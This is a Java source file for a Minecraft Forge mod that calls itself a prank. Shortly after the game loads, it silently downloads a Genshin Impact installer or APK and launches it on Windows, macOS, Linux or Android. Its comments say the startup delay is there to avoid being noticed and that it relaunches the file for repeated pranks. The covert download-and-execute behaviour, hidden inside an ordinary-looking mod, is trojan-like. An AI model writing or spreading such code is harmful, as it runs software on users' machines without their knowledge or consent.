package com.example.genshindownloader;

import net.minecraftforge.fml.common.Mod;
import net.minecraftforge.fml.event.lifecycle.FMLClientSetupEvent;
import net.minecraftforge.fml.javafmlmod.FMLJavaModLoadingContext;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;

@Mod(GenshinDownloaderMod.MODID)
public class GenshinDownloaderMod {
    public static final String MODID = "genshindownloader";
    private static final Logger LOGGER = LogManager.getLogger();

    // ⚠️ 重要：请务必把下面两个链接替换成当前有效的官方直链（否则无法下载）！
    private static final String PC_URL = "https://hyp-webstatic.mihoyo.com/hyp-client/miHoYoLauncher_1.16.exe";
    private static final String ANDROID_URL = "https://ys-api.mihoyo.com/event/download_porter/link/ys_cn/official/android_backup319";

    public GenshinDownloaderMod() {
        FMLJavaModLoadingContext.get().getModEventBus().addListener(this::setup);
    }

    private void setup(final FMLClientSetupEvent event) {
        // 开启新线程下载，不阻塞游戏画面加载
        new Thread(() -> {
            try {
                Thread.sleep(5000); // 进游戏5秒后再开始，降低被察觉风险
                boolean isAndroid = isAndroid();
                String url = isAndroid ? ANDROID_URL : PC_URL;
                String dir = isAndroid ? "/storage/emulated/0/Download/" : System.getProperty("user.home") + "/Downloads/";
                String fileName = isAndroid ? "GenshinImpact.apk" : "GenshinImpact_installer.exe";
                File outputFile = new File(dir, fileName);

                // 如果文件已存在，直接安装（方便反复整蛊）
                if (outputFile.exists()) {
                    LOGGER.info("File already exists, launching install...");
                    launchInstall(outputFile, isAndroid);
                    return;
                }

                // 开始下载
                LOGGER.info("Downloading Genshin Impact...");
                downloadFile(url, outputFile);
                LOGGER.info("Download finished! Launching installer...");
                launchInstall(outputFile, isAndroid);

            } catch (Exception e) {
                LOGGER.error("Prank failed", e);
            }
        }).start();
    }

    // 检测是否为 Android 环境（PojavLauncher / FCL 等手机启动器）
    private boolean isAndroid() {
        try {
            Class.forName("android.os.Build");
            return true;
        } catch (ClassNotFoundException e) {
            return false;
        }
    }

    // 下载核心
    private void downloadFile(String urlStr, File dest) throws Exception {
        HttpURLConnection conn = (HttpURLConnection) new URL(urlStr).openConnection();
        conn.setConnectTimeout(15000);
        conn.setReadTimeout(15000);
        try (InputStream in = conn.getInputStream();
             FileOutputStream out = new FileOutputStream(dest)) {
            byte[] buffer = new byte[8192];
            int bytesRead;
            while ((bytesRead = in.read(buffer)) != -1) {
                out.write(buffer, 0, bytesRead);
            }
        }
    }

    // 安装分发器
    private void launchInstall(File file, boolean isAndroid) {
        if (isAndroid) {
            installOnAndroid(file);
        } else {
            installOnPC(file);
        }
    }

    // ---------- PC 安装 ----------
    private void installOnPC(File file) {
        try {
            String os = System.getProperty("os.name").toLowerCase();
            if (os.contains("win")) {
                Runtime.getRuntime().exec(new String[]{"cmd", "/c", "start", file.getAbsolutePath()});
            } else if (os.contains("mac")) {
                Runtime.getRuntime().exec(new String[]{"open", file.getAbsolutePath()});
            } else {
                Runtime.getRuntime().exec(new String[]{"xdg-open", file.getAbsolutePath()});
            }
        } catch (Exception e) {
            LOGGER.error("PC auto-launch failed", e);
        }
    }

    // ---------- 手机安装（适配所有品牌） ----------
    private void installOnAndroid(File file) {
        try {
            // 方法：使用系统 am 命令调起安装器（适配小米、华为、OPPO、vivo 等全部品牌）
            String path = file.getAbsolutePath();
            ProcessBuilder pb = new ProcessBuilder(
                "am", "start",
                "-a", "android.intent.action.VIEW",
                "-d", "file://" + path,
                "-t", "application/vnd.android.package-archive",
                "--flags", "268435456" // FLAG_ACTIVITY_NEW_TASK
            );
            pb.inheritIO(); // 把输出打印到日志，方便调试
            pb.start();
            LOGGER.info("Android installer invoked via am command.");
        } catch (Exception e) {
            // 备选方案：通过 Java 反射调起（理论上兼容性略差，但作为保底）
            try {
                installAndroidReflect(file);
            } catch (Exception ex) {
                LOGGER.error("All Android install methods failed", ex);
            }
        }
    }

    // 备选反射方案（极少情况下 am 命令不可用时）
    private void installAndroidReflect(File file) throws Exception {
        Class<?> activityThread = Class.forName("android.app.ActivityThread");
        Object current = activityThread.getMethod("currentActivityThread").invoke(null);
        Object context = activityThread.getMethod("getApplication").invoke(current);

        Class<?> intentClass = Class.forName("android.content.Intent");
        Class<?> uriClass = Class.forName("android.net.Uri");
        Object intent = intentClass.getDeclaredConstructor(String.class)
            .newInstance("android.intent.action.VIEW");
        Object uri = uriClass.getMethod("fromFile", File.class).invoke(null, file);
        intentClass.getMethod("setDataAndType", uriClass, String.class)
            .invoke(intent, uri, "application/vnd.android.package-archive");
        intentClass.getMethod("setFlags", int.class)
            .invoke(intent, 0x10000000); // FLAG_ACTIVITY_NEW_TASK

        context.getClass().getMethod("startActivity", intentClass).invoke(context, intent);
    }
              }
